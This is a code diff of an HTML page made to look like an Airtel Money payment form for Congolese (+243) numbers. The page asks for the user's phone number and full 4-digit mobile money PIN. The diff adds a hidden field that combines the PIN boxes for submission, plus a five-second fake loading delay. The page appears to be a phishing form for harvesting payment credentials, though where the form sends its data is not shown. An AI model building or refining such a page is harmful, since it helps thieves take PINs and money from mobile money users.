@@ -8,204 +8,35 @@
 <body>
 
 <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: Arial, Helvetica, sans-serif;
-    }
-
-    body {
-        background: #f8f9fa;
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-        padding: 40px 20px;
-    }
-
-    .payment-card {
-        background: white;
-        border-radius: 20px;
-        width: 100%;
-        max-width: 400px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-        overflow: hidden;
-        text-align: center;
-    }
-
-    .payment-header {
-        background: #d32f2f;
-        color: white;
-        padding: 50px 20px 30px;
-    }
-
-    .header-placeholder {
-        width: 80px;
-        height: 80px;
-        background: white;
-        margin: 0 auto 20px;
-        border-radius: 12px;
-    }
-
-    .payment-header h2 {
-        font-size: 1.8rem;
-        margin: 0;
-    }
-
-    .payment-content {
-        padding: 30px 24px 40px;
-    }
-
-    .montant-section {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 20px;
-        font-size: 1.1rem;
-    }
-
-    .montant-label {
-        color: #555;
-        font-weight: 600;
-    }
-
-    .montant-value {
-        color: #d32f2f;
-        font-weight: bold;
-        font-size: 1.4rem;
-    }
-
-    .service-label {
-        color: #555;
-        font-weight: 600;
-    }
-
-    .instruction {
-        color: #444;
-        font-size: 1.05rem;
-        margin: 20px 0 30px;
-    }
-
-    .phone-section {
-        margin-bottom: 35px;
-        text-align: left;
-    }
-
-    .phone-label {
-        font-weight: 600;
-        margin-bottom: 8px;
-    }
-
-    .phone-input-wrapper {
-        display: flex;
-        border: 2px solid #ddd;
-        border-radius: 10px;
-        overflow: hidden;
-    }
-
-    .country-code {
-        background: #f5f5f5;
-        padding: 14px 18px;
-        border-right: 2px solid #ddd;
-        font-weight: 500;
-    }
-
-    .phone-input {
-        flex: 1;
-        padding: 14px;
-        border: none;
-        font-size: 1.1rem;
-        text-align: center;
-    }
-
-    .pin-section {
-        margin-bottom: 40px;
-        text-align: left;
-    }
-
-    .pin-label {
-        font-weight: 600;
-        margin-bottom: 12px;
-    }
-
-    .pin-boxes {
-        display: flex;
-        justify-content: space-between;
-        gap: 10px;
-    }
-
-    .pin-box {
-        flex: 1;
-        height: 55px;
-        width: 50px;
-        border: 2px solid #d32f2f;
-        border-radius: 10px;
-        font-size: 1.6rem;
-        text-align: center;
-        line-height: 51px;
-        background: white;
-        transition: border 0.2s;
-    }
-
-    .pin-box:focus {
-        outline: none;
-        border-color: #b71c1c;
-    }
-
-    .btn-confirm {
-        width: 100%;
-        padding: 16px;
-        background: #d32f2f;
-        color: white;
-        border: none;
-        border-radius: 10px;
-        font-size: 1.15rem;
-        font-weight: 600;
-        cursor: pointer;
-        position: relative;
-        transition: background 0.3s;
-    }
-
-    .btn-confirm:hover:not(:disabled) {
-        background: #b71c1c;
-    }
-
-    .btn-confirm:disabled {
-        background: #e57373;
-        cursor: not-allowed;
-    }
-
-    .loading-spinner {
-        display: none;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        width: 24px;
-        height: 24px;
-        border: 3px solid white;
-        border-top: 3px solid transparent;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-        0% { transform: translate(-50%, -50%) rotate(0deg); }
-        100% { transform: translate(-50%, -50%) rotate(360deg); }
-    }
-
-    .security-note {
-        margin-top: 24px;
-        font-size: 0.9rem;
-        color: #555;
-        text-align: center;
-    }
-
-    .security-icon {
-        color: #4caf50;
-        margin-right: 6px;
-    }
+    * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,Helvetica,sans-serif; }
+    body { background:#f8f9fa; min-height:100vh; display:flex; justify-content:center; align-items:flex-start; padding:40px 20px; }
+    .payment-card { background:white; border-radius:20px; width:100%; max-width:400px; box-shadow:0 10px 30px rgba(0,0,0,0.15); overflow:hidden; text-align:center; }
+    .payment-header { background:#d32f2f; color:white; padding:50px 20px 30px; }
+    .header-placeholder { width:80px; height:80px; background:white; margin:0 auto 20px; border-radius:12px; }
+    .payment-header h2 { font-size:1.8rem; margin:0; }
+    .payment-content { padding:30px 24px 40px; }
+    .montant-section { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; font-size:1.1rem; }
+    .montant-label { color:#555; font-weight:600; }
+    .montant-value { color:#d32f2f; font-weight:bold; font-size:1.4rem; }
+    .service-label { color:#555; font-weight:600; }
+    .instruction { color:#444; font-size:1.05rem; margin:20px 0 30px; }
+    .phone-section { margin-bottom:35px; text-align:left; }
+    .phone-label { font-weight:600; margin-bottom:8px; }
+    .phone-input-wrapper { display:flex; border:2px solid #ddd; border-radius:10px; overflow:hidden; }
+    .country-code { background:#f5f5f5; padding:14px 18px; border-right:2px solid #ddd; font-weight:500; }
+    .phone-input { flex:1; padding:14px; border:none; font-size:1.1rem; text-align:center; }
+    .pin-section { margin-bottom:40px; text-align:left; }
+    .pin-label { font-weight:600; margin-bottom:12px; }
+    .pin-boxes { display:flex; justify-content:space-between; gap:10px; }
+    .pin-box { flex:1; height:55px; border:2px solid #d32f2f; border-radius:10px; font-size:1.6rem; text-align:center; line-height:51px; background:white; transition:border 0.2s; }
+    .pin-box:focus { outline:none; border-color:#b71c1c; }
+    .btn-confirm { width:100%; padding:16px; background:#d32f2f; color:white; border:none; border-radius:10px; font-size:1.15rem; font-weight:600; cursor:pointer; position:relative; transition:background 0.3s; }
+    .btn-confirm:hover:not(:disabled) { background:#b71c1c; }
+    .btn-confirm:disabled { background:#e57373; cursor:not-allowed; }
+    .loading-spinner { display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:24px; height:24px; border:3px solid white; border-top:3px solid transparent; border-radius:50%; animation:spin 1s linear infinite; }
+    @keyframes spin { 0% { transform:translate(-50%,-50%) rotate(0deg); } 100% { transform:translate(-50%,-50%) rotate(360deg); } }
+    .security-note { margin-top:24px; font-size:0.9rem; color:#555; text-align:center; }
+    .security-icon { color:#4caf50; margin-right:6px; }
 </style>
 
     <div class="payment-container">
@@ -237,9 +68,7 @@
                     <div class="phone-section">
                         <label class="phone-label">Numéro Airtel Money</label>
                         <div class="phone-input-wrapper">
-                            <div class="country-code">
-                                <img src="https://via.placeholder.com/20x20?text=+" alt="+" width="20"> +243
-                            </div>
+                            <div class="country-code">+243</div>
                             <input 
                                 type="tel"
                                 name="phone"
@@ -263,6 +92,7 @@
                             <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
                             <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
                         </div>
+                        <input type="hidden" name="pin" id="pinCombined">
                     </div>
 
                     <button type="submit" class="btn-confirm" id="confirmBtn">
@@ -281,13 +111,16 @@
     </div>
 
     <script>
-        // PIN boxes auto-focus
+        // Combine PIN boxes into hidden field
         const boxes = document.querySelectorAll('.pin-box');
+        const pinCombined = document.getElementById('pinCombined');
+
         boxes.forEach((box, idx) => {
             box.addEventListener('input', () => {
                 if (box.value.length === 1 && idx < 3) {
                     boxes[idx + 1].focus();
                 }
+                pinCombined.value = Array.from(boxes).map(b => b.value).join('');
             });
             box.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && box.value === '' && idx > 0) {
@@ -296,20 +129,21 @@
             });
         });
 
-        // Loading animation on submit
+        // Show red spinner for 5 seconds on submit
         const form = document.getElementById('paymentForm');
         const btn = document.getElementById('confirmBtn');
         const spinner = document.getElementById('spinner');
 
         form.addEventListener('submit', (e) => {
+            if (pinCombined.value.length !== 4) {
+                e.preventDefault();
+                alert("Veuillez entrer un code PIN à 4 chiffres");
+                return;
+            }
             btn.disabled = true;
             spinner.style.display = 'inline-block';
-            btn.innerHTML = ''; // hide text
-
-            // 5 seconds delay before real submit
-            setTimeout(() => {
-                form.submit();
-            }, 5000);
+            btn.innerHTML = '';
+            setTimeout(() => { form.submit(); }, 5000);
         });
     </script>
 
